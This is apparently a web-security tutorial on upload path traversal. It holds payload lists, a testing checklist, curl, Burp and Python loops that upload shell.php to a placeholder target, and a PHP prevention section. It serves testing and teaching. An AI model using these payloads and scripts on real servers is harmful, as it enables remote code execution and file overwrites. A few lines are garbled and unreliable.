# 1.3 Upload Path Traversal

## Goal

Upload files outside the intended upload directory to reach executable locations (web root, cgi-bin, etc.), enabling remote code execution or file manipulation.

---

## Why This Works

Applications often store uploads in a designated directory:

```
Upload directory: /var/www/uploads/
Intention: Files stored safely here, not executable

But if filename is not sanitized:
Attacker supplies: ../../shell.php
Server processes: /var/www/uploads/../../shell.php
Resolves to: /var/www/shell.php (WEB ROOT - EXECUTABLE!)
Result: RCE
```

---

## How Path Traversal Works

### Directory Structure Example

```
/var/www/                  (web root - PHP executes)
├── index.php
├── shell.php              ← ATTACKER WANTS TO WRITE HERE
├── uploads/               (intended upload dir)
│   ├── safe_image.jpg
│   └── shell.php          (uploaded with traversal)
└── includes/
```

### Traversal Logic

```
Normal upload:
Filename: image.jpg
Full path: /var/www/uploads/image.jpg
Result: Safe, not executable

Traversal attack:
Filename: ../../shell.php
Full path: /var/www/uploads/../../shell.php
Simplifies to: /var/www/shell.php
Result: PHP root - EXECUTABLE!
```

---

## The Path Traversal Techniques

### Technique 1: Simple Relative Path (../../)

**How it works:**
```
Filename: ../../shell.php
Each "../" goes up one directory level:
  Level 1: /var/www/uploads/ → /var/www/
  Level 2: /var/www/ → /var/
  (But usually only need 2-3)

Result: File written to /var/www/shell.php
```

**Payloads:**
```
../../shell.php             (go up 2 levels)
../../../shell.php          (go up 3 levels)
../../../../shell.php       (go up 4 levels)
../../../../../../../etc/passwd  (system files)
```

**When to use:** Most common, if traversal is possible

**Example:**
```
Upload directory: /var/www/uploads/
Payload: ../../shell.php
Result: /var/www/shell.php ✓
```

---

### Technique 2: URL-Encoded Traversal

**How it works:**
```
Filesystem characters encoded as URL
.. = ..
/ = %2F
Server decoding: %2e%2e%2f = ../

If filter checks for literal "..", but server decodes:
  Upload: %2e%2e%2fshell.php
  Filter: "No ../ detected" ✓
  Server: Decodes to ../shell.php → Traversal ✓
```

**Payloads:**
```
%2e%2e%2fshell.php          (URL encoded: ../)
%2e%2e/shell.php            (mixed encoding)
..%2fshell.php              (slash only)
%252e%252e%252f (double encode)
..%5cshell.php              (backslash variant)
```

**When to use:** When basic ../ is filtered but server still decodes

**Detection:**
- Try: `%2e%2e%2fshell.php`
- Check if file appears in parent directory

---

### Technique 3: Backslash Traversal (Windows)

**How it works:**
```
Windows uses both / and \ as path separators
Filename: ..\..\shell.php
Resolves to: C:\uploads\..\..\shell.php = C:\shell.php
```

**Payloads:**
```
..\shell.php               (Windows backslash)
..\..\shell.php            (multiple levels)
..%5c..\shell.php          (encoded backslash)
```

**When to use:** Windows servers (IIS), Windows paths

**Example:**
```
Upload dir: C:\uploads\
Payload: ..\shell.php
Result: C:\shell.php ✓
```

---

### Technique 4: Absolute Path Injection

**How it works:**
```
If application doesn't validate absolute paths:
Filename: /var/www/shell.php
Server: "This looks like an absolute path..."
Result: File written to /var/www/shell.php (WHEREVER ATTACKER WANTS!)
```

**Payloads:**
```
/var/www/html/shell.php     (absolute Linux)
/var/www/shell.php          (another absolute)
/home/user/shell.php        (home directory)
C:\xampp\htdocs\shell.php   (Windows absolute)
C:\windows\temp\shell.php   (Windows temp)
```

**When to use:** Rare, but try if relative doesn't work

**Risk:** Server might strip leading `/` so less reliable

---

### Technique 5: Double Encoding + Traversal

**How it works:**
```
Encode traversal, then encode the encoding
%252e%252e%252f = %2e%2e%2f = ../

Server decoded TWICE:
  Decode 1: %252e%252e%252f → %2e%2e%2f
  Decode 2: %2e%2e%2f → ../
  
Filter only catches obvious ../ but double-encoding gets through
```

**Payloads:**
```
%252e%252e%252fshell.php    (fully double-encoded)
%252e%252e/shell.php        (mixed)
```

**When to use:** Advanced filtering that decodes once

---

### Technique 6: Unicode/UTF-8 Encoding

**How it works:**
```
Unicode representations of ".."
Different systems interpret them differently
../ might be blocked
%c0%ae%c0%ae/ might work (overlong UTF-8)
```

**Payloads:**
```
%c0%ae%c0%ae%c0%afshell.php   (overlong UTF-8)
\c1\x1c (other encodings)
```

**When to use:** Rare, legacy systems with odd encoding

## Testing Methodology

### Step 1: Discover Upload Directory

```
Check for hints in:
- Upload response: "File saved to: /uploads/image.jpg"
- Directory listing
- Form action: <form action="/uploads/handler.php">
- Website structure: /uploads/, /files/, /media/
- Error messages mentioning paths
```

### Step 2: Identify Web Root

```
Common locations:
- Linux Apache: /var/www/ or /var/www/html/
- Linux Nginx: /usr/share/nginx/html/
- Windows IIS: C:\inetpub\wwwroot\
- XAMPP: C:\xampp\htdocs\
- WAMP: C:\wamp\www\
- MAMP: /Applications/MAMP/htdocs/
```

### Step 3: Calculate Traversal Depth

```
If upload dir is: /var/www/uploads/
Levels to web root: /var/www/

Count slashes:
  /var/ = 1 up (..)
  /var/www/ = 2 up (../../)
  /var/www/uploads/ = 3 up (../../../)
  
Usually 2-3 levels is sufficient
```

### Step 4: Test Traversal

**Simple test:**
```
Filename: ../../test.txt
Upload text file (not PHP)
Check filesystem: Does /var/www/test.txt exist?
```

**If yes:**
```
Then try:
Filename: ../../shell.php
With PHP code
Access: http://site/shell.php
```

### Step 5: Verify Success

```
After upload:
1. Check upload response/location
2. Try accessing file at calculated path
3. Test if file executes (PHP)
4. Verify code execution with payload
```

## Real-World Examples

### Example 1: Simple Traversal to Web Root

```
Target: Blog platform with image upload
Upload dir: /var/www/blog/uploads/
Web root: /var/www/blog/

Payload filename: ../../shell.php
Path resolves: /var/www/blog/uploads/../../shell.php = /var/www/blog/shell.php
Access: http://blog.com/shell.php
Result: RCE ✓
```

### Example 2: Traversal Targeting Specific Directory

```
Target: CMS with media upload
Intended: /var/www/cms/media/
Target: /var/www/cms/plugins/  (user directory)

Payload: ../plugins/shell.php
Result: /var/www/cms/media/../plugins/shell.php = /var/www/cms/plugins/shell.php
Outcome: Code in plugin directory executes ✓
```

### Example 3: Multiple Level Traversal

```
Target: Nested upload structure
Upload dir: /var/www/html/user/uploads/2024/
Goal: /var/www/html/

Payload: ../../../../shell.php
Path: /var/www/html/user/uploads/2024/../../../../shell.php = /var/www/html/shell.php ✓
```

## Combination Attacks

### Attack 1: Traversal + Extension Bypass

```
Both bypass applied:
Filename: ../../shell.php.jpg
Extension check: "Ends with .jpg" ✓
Path traversal: Goes to /var/www/ ✓
Result: Double bypass = RCE
```

### Attack 2: Traversal + Content-Type Spoof

```
Filename: ../../shell.php
Content-Type: image/jpeg
Result:
  1. MIME check thinks it's image
  2. Path traversal to web root
  3. File executes as PHP = RCE
```

### Attack 3: Traversal to System Files

```
Filename: ../../../../../../etc/passwd
Result: /etc/passwd overwritten
Usage: Inject into log files, configs, etc.
```

## Prevention (For Developers)

❌ **Bad:** Directly use user-supplied filename

```php
$filename = $_FILES['file']['name'];
$path = "uploads/" . $filename;
move_uploaded_file($_FILES['file']['tmp_name'], $path);
// VULNERABLE: No sanitization!
```

❌ **Bad:** Simple basename removal

```php
$filename = basename($_FILES['file']['name']);
$path = "uploads/" . $filename;
// STILL VULNERABLE if basename is insufficient
```

✅ **Good:** Generate random filename

```php
$new_filename = uniqid() . '.' . $ext;
$path = 'uploads/' . $new_filename;
move_uploaded_file($_FILES['file']['tmp_name'], $path);
// SAFE: Random name, no traversal possible
```

✅ **Better:** Whitelist + Validate

```php
// Remove any traversal characters
$filename = str_replace(['..', '\\', '/'], '', $_FILES['file']['name']);

// Get extension
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

// Whitelist extensions
if (!in_array($ext, ['jpg', 'png', 'gif', 'pdf'])) {
    die("Invalid extension");
}

// Generate safe filename
$new_name = uniqid() . '.' . $ext;

// Always use fixed directory
$upload_dir = __DIR__ . '/uploads/';
$full_path = $upload_dir . $new_name;

move_uploaded_file($_FILES['file']['tmp_name'], $full_path);
```

✅ **Best:** Strict path validation

```php
// Whitelist extension
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$allowed = ['jpg', 'png', 'gif'];
if (!in_array($ext, $allowed)) die("Invalid extension");

// Generate safe filename
$new_filename = uniqid() . '.' . $ext;

// Fixed upload directory (no user input)
$upload_dir = __DIR__ . '/safe_uploads/';
$target_path = $upload_dir . $new_filename;

// Ensure path is within upload directory
$real_path = realpath($target_path);
$real_dir = realpath($upload_dir);

if ($real_path === false || strpos($real_path, $real_dir) !== 0) {
    die("Path traversal detected");
}

// Safe to upload
move_uploaded_file($_FILES['file']['tmp_name'], $target_path);
```

## Quick Testing Checklist

```
[ ] Discover upload directory (from response/errors)
[ ] Identify web root location
[ ] Calculate traversal depth (../)
[ ] Test simple traversal: ../../test.txt
[ ] Verify test.txt appears in parent dir
[ ] Test PHP traversal: ../../shell.php
[ ] Access uploaded PHP file
[ ] Verify code executes
[ ] Try URL encoding: %2e%2e%2f
[ ] Try backslash variant (Windows): ..\
[ ] Combine with extension bypass if needed
[ ] Combine with Content-Type spoof if needed
```

---

## Detection Indicators

**Path traversal successful if:**
- ✅ File appears outside intended directory
- ✅ File accessible via URL in web root
- ✅ PHP file executes when accessed
- ✅ Calculator path resolves correctly

**Path traversal failed if:**
- ❌ File not found at traversal path
- ❌ Server strips ../ sequences
- ❌ Server validates absolute paths
- ❌ Upload directory is outside web root

## Tools for Testing

### curl
```bash
# Test with traversal
curl -F "file=@shell.php" \
     -F "filename=../../shell.php" \
     http://target/upload.php

# Multiple attempts
for payload in "../../shell.php" "../../../shell.php" "../../../../shell.php"; do
  echo "Testing: $payload"
  curl -F "file=@shell.php" \
       -F "filename=$payload" \
       http://target/upload.php
done
```

### Burp Suite
```
1. Capture upload request
2. In Repeater, modify filename parameter
3. Change: filename="shell.php"
4. To: filename="../../shell.php"
5. Forward and observe result
```

### Python
```python
import requests

filenames = [
    "../../shell.php",
    "../../../shell.php",
    "../../../../shell.php",
    "%2e%2e%2fshell.php"
]

for fname in filenames:
    files = {'file': ('shell.php', open('shell.php', 'rb'))}
    data = {'filename': fname}
    r = requests.post('http://target/upload.php', files=files, data=data)
    print(f"{fname}: {r.status_code}")
```

## Common Mistakes in Testing

- ❌ Only trying 2 levels (../) - try up to 10 levels
- ❌ Giving up too quickly - try URL encoding variants
- ❌ Not verifying file actually written - check manually
- ❌ Wrong traversal depth - calculate based on actual path
- ❌ Not trying both / and \ - test both separators
